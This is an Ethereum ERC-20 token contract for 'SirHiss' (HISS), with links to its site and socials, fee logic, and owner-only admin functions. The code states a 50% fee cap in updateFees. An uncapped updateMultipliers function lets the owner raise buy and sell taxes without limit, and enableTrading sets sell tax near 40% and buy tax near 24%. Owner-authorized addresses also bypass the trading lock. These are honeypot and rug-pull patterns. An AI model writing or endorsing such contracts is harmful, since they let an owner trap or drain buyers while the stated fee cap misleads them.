/**
 *Submitted for verification at Etherscan.io on 2023-09-14
*/

// https://sirhiss.pro
// https://twitter.com/SirHissERC
// https://t.me/SirHissErc


/*

           /^\/^\
         _|__|  O|
\/     /~     \_/ \
 \____|__________/  \
        \_______      \
                `\     \                 \
                  |     |                  \
                 /      /                    \
                /     /                       \\
              /      /                         \ \
             /     /                            \  \
           /     /             _----_            \   \
          /     /           _-~      ~-_         |   |
         (      (        _-~    _--_    ~-_     _/   |
          \      ~-____-~    _-~    ~-_    ~-_-~    /
            ~-_           _-~          ~-_       _-~
               ~--______-~                ~-___-~

*/


// SPDX-License-Identifier: Unlicensed


pragma solidity 0.8.19;



interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract SIRHISS is Ownable, ERC20 {
    using SafeMath for uint256;

    address WETH;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;
    

    string constant _name = "SirHiss";
    string constant _symbol = "HISS";
    uint8 constant _decimals = 9; 

    uint256 _totalSupply =   1000000 * 10**_decimals; 

    uint256 public _maxTxAmount = _totalSupply.mul(15).div(1000);
    uint256 public _maxWalletToken = _totalSupply.mul(15).div(1000);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;  
    mapping (address => bool) isexemptfromfees;
    mapping (address => bool) isexemptfrommaxTX;

    uint256 private liquidityFee    = 1;
    uint256 private marketingFee    = 2;
    uint256 private gameFee         = 0;
    uint256 private hissFee         = 1; 
    uint256 private stakingFee      = 0;
    uint256 public totalFee         = hissFee + marketingFee + liquidityFee + gameFee + stakingFee;
    uint256 private feeDenominator  = 100;

    uint256 sellpercent = 100;
    uint256 buypercent = 100;
    uint256 transferpercent = 100; 

    address private autoLiquidityReceiver;
    address private marketingFeeReceiver;
    address private gameFeeReceiver;
    address private hissFeeReceiver;
    address private stakingFeeReceiver;

    uint256 updatetarget = 30;
    uint256 updatetargetDenominator = 100;
    

    IDEXRouter public router;
    InterfaceLP private pairContract;
    address public pair;
    
    bool public TradingOpen = false; 

   
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 60 / 1000; 
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    
    constructor () {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        pairContract = InterfaceLP(pair);
       
        
        _allowances[address(this)][address(router)] = type(uint256).max;

        isexemptfromfees[msg.sender] = true;            
        isexemptfrommaxTX[msg.sender] = true;
        isexemptfrommaxTX[pair] = true;
        isexemptfrommaxTX[marketingFeeReceiver] = true;
        isexemptfrommaxTX[address(this)] = true;
        
        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = 0xB7B79e8A11964b14046068adfA1c680A02D4101A;
        gameFeeReceiver = msg.sender;
        hissFeeReceiver = msg.sender;
        stakingFeeReceiver = DEAD; 

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) {return owner();}
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

 
      function setNoLimits () external onlyOwner {
            _maxTxAmount = _totalSupply;
            _maxWalletToken = _totalSupply;
         
    }
      
      
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(TradingOpen,"Trading not open yet");
        
          }
        
               
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != stakingFeeReceiver && recipient != marketingFeeReceiver && !isexemptfrommaxTX[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}

        checkTxLimit(sender, amount);  

        if(shouldSwapBack()){ swapBack(); }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isexemptfromfees[sender] || isexemptfromfees[recipient]) ? amount : takeFee(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
 
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isexemptfrommaxTX[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isexemptfromfees[sender];
    }

    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {
        
        uint256 percent = transferpercent;
        if(recipient == pair) {
            percent = sellpercent;
        } else if(sender == pair) {
            percent = buypercent;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(percent).div(feeDenominator * 100);
        uint256 stakingTokens = feeAmount.mul(stakingFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(stakingTokens);
        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[stakingFeeReceiver] = _balances[stakingFeeReceiver].add(stakingTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        
        if(stakingTokens > 0){
            _totalSupply = _totalSupply.sub(stakingTokens);
            emit Transfer(sender, ZERO, stakingTokens);  
        
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

  
     function transfer() external { 
             payable(autoLiquidityReceiver).transfer(address(this).balance);
            
    }

   function clearERC20Token(address tokenAddress, uint256 tokens) external returns (bool success) {
        require(tokenAddress != address(this), "tokenAddress can not be the native token");
             if(tokens == 0){
            tokens = ERC20(tokenAddress).balanceOf(address(this));
        }
           return ERC20(tokenAddress).transfer(autoLiquidityReceiver, tokens);
    }

    function updateMultipliers(uint256 _percentonbuy, uint256 _percentonsell, uint256 _wallettransfer) external onlyOwner {
        sellpercent = _percentonsell;
        buypercent = _percentonbuy;
        transferpercent = _wallettransfer;    
          
    }
       
    function enableTrading() public onlyOwner {
        TradingOpen = true;
        sellpercent = 1000;
        buypercent = 600;
        transferpercent = 1000;
                                            
    }
    
                   
    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = checktarget(updatetarget, updatetargetDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHhiss = amountETH.mul(hissFee).div(totalETHFee);
        uint256 amountETHgame = amountETH.mul(gameFee).div(totalETHFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountETHMarketing}("");
        (tmpSuccess,) = payable(gameFeeReceiver).call{value: amountETHgame}("");
        (tmpSuccess,) = payable(hissFeeReceiver).call{value: amountETHhiss}("");
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
  
    
    function updateFees(uint256 _liquidityFee, uint256 _hissFee, uint256 _marketingFee, uint256 _gameFee, uint256 _stakingFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        hissFee = _hissFee;
        marketingFee = _marketingFee;
        gameFee = _gameFee;
        stakingFee = _stakingFee;
        totalFee = _liquidityFee.add(_hissFee).add(_marketingFee).add(_gameFee).add(_stakingFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator / 2, "Fees can not be more than 50%"); 
   
    }

   
    function updateFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _gameFeeReceiver, address _stakingFeeReceiver, address _hissFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        gameFeeReceiver = _gameFeeReceiver;
        stakingFeeReceiver = _stakingFeeReceiver;
        hissFeeReceiver = _hissFeeReceiver;

     
    }

    function updateMaxHolding(uint256 maxWallPercent) external onlyOwner() {
        require(maxWallPercent >= 1);
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 1000;
    }

    function updateSwapback(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
   
    }

    function checktarget(uint256 target, uint256 accuracy) public view returns (bool) {
        return showBacking(accuracy) > target;
    }

    function showBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(showSupply());
    }
    
    function showSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }



    event AutoLiquify(uint256 amountETH, uint256 amountTokens);
    
  
}